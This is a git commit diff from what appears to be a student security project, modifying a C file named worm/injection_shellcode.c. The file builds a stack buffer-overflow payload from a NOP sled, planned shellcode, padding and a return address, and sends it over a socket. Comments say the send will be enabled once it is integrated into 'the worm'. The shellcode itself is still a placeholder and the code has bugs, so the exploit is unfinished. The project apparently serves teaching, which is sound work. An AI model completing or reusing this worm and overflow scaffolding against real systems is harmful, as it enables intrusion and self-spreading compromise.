d5d4a5cc0e2f5664b59665f73e350b88035f185d
osboxes.org <drezet@etud.insa-toulouse.fr>
2023-02-21 15:12:45 +0100

    overflow_done

--- worm/injection_shellcode.c
+++ worm/injection_shellcode.c
@@ -8,24 +8,17 @@
 
 // Voir fonction strcat pour concaténer des chars (string.h)
 
-void func(int sockfd, char *pay)
+int func(int sockfd, char *pay)
 {
-	/*char buff[MAX];
-	int n;
-	bzero(buff, sizeof(buff));
-	n = 0;
-	while ((buff[n++] = getchar()) != '\n')
-		;*/
 	printf("Overflow en cours...");
-	write(sockfd, pay, sizeof(pay));
-	//bzero(buff, sizeof(buff));
-	read(sockfd, pay, sizeof(pay));
-	printf("From Server : %s", pay);
-
-	/*if ((strncmp(buff, "exit", 4)) == 0) {
-		printf("Client Exit...\n");
-		break;
-	}*/
+	int verif = write(sockfd, pay, sizeof(pay));
+	if (verif == -1){
+		printf("Error : Payload sending failed\n");
+	}
+	else {
+		printf("Payload successfully send !\n");
+	}
+	return verif;
 }
 
 /*unsigned long get_sp(void) {
@@ -35,27 +28,21 @@ long l=get_sp();
 printf("Ox%lu\n", l);
 */
 
-
-
 int main (int argc, char *argv[]){
 
-	//int sockfd = (int)argv[1];
-	int sockfd = 1;
-
-    if (argc != 2) {
-        printf("Erreur: la fonction %s ne requiert aucun parametres\n", argv[0]);
-        return 1;
-    }
+	int sockfd = 1; // A CHANGER ET METTRE L'ARG DE LA FCT A LA PLACE 
 	
     // Ecriture en dur du shellcode : 
-    // NOP *40(etc 1 octet chaque) + shellcode (taille à définir POUR TAILLE BOF) 
-    // + "A" *4(1 octet chaque) + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
+    // NOP *40(etc 1 octet chaque)
+	// + shellcode (taille à définir POUR TAILLE BOF) 
+    // + "A" *4(1 octet chaque)
+	// + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
     char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x42\x41\x41\x41\x41\x40"; // A COMPLETER
 
-    // COMMENT @retour = @base pile + taille instruction ENTIERE !!!
+    // COMMENT @retour = @base pile + taille instruction ENTIERE
 
     // Envoi de la payload
-	func(sockfd, payload);
+	//int over_flow = func(sockfd, payload);  // A DECOMMENTER UNE FOIS INTEGREE DANS LE VERS
 
     printf("%s\n", payload);
 	printf("OK\n");
